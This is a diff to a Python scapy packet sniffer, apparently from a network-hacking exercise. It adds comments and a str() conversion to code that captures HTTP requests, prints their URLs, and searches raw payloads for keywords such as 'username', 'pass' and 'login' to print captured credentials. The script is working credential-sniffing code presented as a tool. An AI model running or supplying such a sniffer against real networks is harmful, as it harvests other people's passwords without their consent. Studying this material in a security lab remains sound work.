@@ -11,7 +11,7 @@ def process_sniffed_packet(packet):
     #haslayer returns layer in braces
     if packet.haslayer(http.HTTPRequest):
         url = get_url(packet)
-        print("[+] HTTP Request >> " + url)
+        print("[+] HTTP Request >> " + str(url))
         info = get_login_info(packet)
         if info:
             print("\n\n[+] Possible username/password > " + info + "\n\n")
@@ -19,12 +19,14 @@ def process_sniffed_packet(packet):
 def get_login_info(packet):
      if packet.haslayer(scapy.Raw):
             load = packet[scapy.Raw].load   #layers in-btw [], you can do .field_name
+            #keywords are going to be in byte format
             keywords = [b"username", b"uname", b"email", b"user", b"login", b"pass", b"id", b"ID", b"role"]
             for key in keywords:
                 if key in load:
                     return load.decode("utf-8")
 
 def get_url(packet):
+    #url is host and path e.g google.com/earth
     return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
 
 def main():
